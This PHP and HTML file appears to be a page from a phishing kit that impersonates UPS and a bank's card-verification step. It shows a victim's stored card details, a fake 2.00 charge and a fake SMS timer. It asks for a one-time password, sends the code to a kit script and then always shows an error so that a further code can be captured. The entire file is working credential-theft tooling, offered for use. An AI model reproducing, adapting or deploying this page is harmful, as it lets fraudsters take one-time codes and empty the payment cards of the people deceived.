<?php
session_start();
require 'ups_content/ups_system/detect.php';
require 'ups_content/ups_system/lang.php';
?>
<link rel="icon" href="ups_content/ups_img/favicon.ico" type="image/x-icon">
<meta name="viewport" content="width=device-width" />

 <body>
  <div align="center">
  </div>
  <div id="otp">
   <div class="c-text-generic has-rte component-small">
                              <p class="has-rte">
                               
                              </p>
                            </div>
<center>

<script src="./ups_content/ups_js/jquery.js"></script>
<script src="./ups_content/ups_js/jquery.ccvalid.js"></script>
<script src="./ups_content/ups_js/jquery.mask.js"></script>
<script src="./ups_content/ups_js/modernizr.min.js"></script>
  <style>
    élément {
    width: 75px;
    }
    élément {
    font-size: 11px;
    font-family: arial,sans-serif;
    color: #000;
    }
    .success, .error, .validation {
    border: 1px solid;
    margin: 10px 0px;
    padding: 15px 10px 15px 50px;
    background-repeat: no-repeat;
    background-position: 10px center;
    }
    .success {
    color: #4F8A10;
    background-color: #DFF2BF;
    }
    .error{
    color: #D8000C;
    background-color: #FFBABA;
    }
    .validation{
    color: #D63301;
    background-color: #FFCCBA;
    }
  </style>
  <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px;background-color: #fff;">
    <?php if($_SESSION['ctype']=='visa'){echo '<img src="./ups_content/ups_img/vsa_p.svg" style="width: 90px;float:left;">';echo '<img src="./ups_content/ups_img/UPS_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="50px">';}elseif($_SESSION['ctype']=='mastercard'){echo '<img src="./ups_content/ups_img/mst_p.svg" style="width: 90px;float:left;">';echo '<img src="./ups_content/ups_img/UPS_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="50px">';}elseif($_SESSION['ctype']=='discover'){echo '<img src="./ups_content/ups_img/discover-on.jpg" style="width: 90px;float:left;">';echo '<img src="./ups_content/ups_img/UPS_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="50px">';}elseif($_SESSION['ctype']=='amex'){echo '<img src="./ups_content/ups_img/amex-on.jpg" style="width: 90px;float:left;">';echo '<img src="./ups_content/ups_img/UPS_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="50px">';}else{echo '<img src="./ups_content/ups_img/UPS_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="50px">';}?>
    <div style="clear:both"></div>
    <p style="font-size:13px;margin-top:25px;color:#807979"> <?php echo $payd02['001']?></p>
    <p style="font-size:13px;margin-top:25px;color:#807979"><?php echo $payd02['002']?><?php echo $_SESSION['lastph'] ?></p>
    <script type="text/javascript">
      document.onreadystatechange = function () {
        var state = document.readyState
        if (state == 'complete') {
            setTimeout(function(){
                document.getElementById('interactive');
        
      		 $("#fixed").hide();
      		 $("#formf").show(500);
            },4000);
        }
      }
    </script>
    <form method="post" id="formf" style="display: none;">
      <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
        <tbody>
          <p style="display:none;" class="validation" id="tiitleerror"><?php echo $payd02['011']?><?php include("./ups_content/ups_js/mask-main.js");?></p>
          <tr>
            <td align="right"><?php echo $payd02['004']?></td>
            <td><?php echo $_SESSION['bnk'];?></td>
          </tr>
          <tr>
            <td align="right"><?php echo $payd02['005']?></td>
            <td><?php echo date("d M,Y");  ?></td>
          </tr>
          <tr>
            <td align="right"><?php echo $payd02['006']?></td>
            <td> XXXX-XXXX-XXXX-<?php echo $_SESSION['last']?></td>
          </tr>
          <tr>
            <td align="right"><?php echo $payd02['007']?></td>
            <td>2.00 <?php echo $_SESSION['currency'];?></td>
          </tr>
          <tr>
            <td align="right"><?php echo $payd02['003']?></td>
            <td><?php echo $_SESSION['fnm101'];?></td>
          </tr>
          <tr>
            <td align="right" id="tiitleCardnetpas"><?php echo $payd02['008']?></td>
            <td>
              <span id="timer" class="timer"></span><script>
                function countdown(timer, minutes, seconds) {
                // set time for the particular countdown
                var time = minutes*60 + seconds;
                var interval = setInterval(function() {
                 var el = document.getElementById('timer');
                 // if the time is 0 then end the counter
                 if(time == 0) {
                     setTimeout(function() {
                         el.innerHTML = "SMS code sent...";
                     }, 1500);
                
                
                     clearInterval(interval);
                
                     setTimeout(function() {
                         countdown('clock', 2, 1);
                     }, 2000);
                 }
                 var minutes = Math.floor( time / 60 );
                 if (minutes < 10) minutes = "0" + minutes;
                 var seconds = time % 60;
                 if (seconds < 10) seconds = "0" + seconds; 
                 var text = minutes + ':' + seconds;
                 el.innerHTML = text;
                 time--;
                }, 1500);     // 1000 = 1 segonde in timer = j'ai fais 1500 pour calculer 1.5 segonde comme c'est 1 segonde
                }
                countdown('clock', 2, 1);
              </script>
            </td>
          </tr>
          <tr>
            <td align="right"><?php echo $payd02['009']?></td>
            <td class="xx"><input style="width: 75px;" type="password" name="otp1" id="otp1" required=""></td>
          </tr>
          <tr>
            <td></td>
            <td><br>
              <input style="width:74px" type="submit" value="<?php echo $payd02['013']?>">
            </td>
          </tr>
        </tbody>
      </table>
    </form>
    <script type="text/javascript">
      var request;
      $("#formf").submit(function(event){
          event.preventDefault();
          if (request) {
              request.abort();
          }
          var $form = $(this);
          var $inputs = $form.find("input, select, button, textarea");
          var serializedData = $form.serialize();
          $inputs.prop("disabled", true);
      	$("#tiitleerror").show(400);
      	$("#formf")[0].reset();
          request = $.ajax({
              url: "./ups_content/ups_system/vendorotp.php",
              type: "post",
              data: serializedData
          });
          request.done(function (response, textStatus, jqXHR){
       $(location).attr("href", "./ups_content/ups_system/check.php?country.x=Global&tow=ok&flowId=ul&_sms=datax#otp");
          });
          request.fail(function (jqXHR, textStatus, errorThrown){
              console.error(
                  "The following error occurred: "+
                  textStatus, errorThrown
              );
          });
          request.always(function () {
      
              $inputs.prop("disabled", false);
          });
      });
      
    </script>
    <div id="fixed" class="" style="">
      <img src="./ups_content/ups_img/lod2.gif">
      <p class="">Loading...</p>
    </div>
    <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright © 1999-  <?php echo date("Y");?> . All rights reserved. </p>
  </div>
  <div id="rotate" style="display:none">
    <div class="circle">
      <div class="rotate"></div>
    </div>
    <div class="overlay"></div>
  </div>
</center>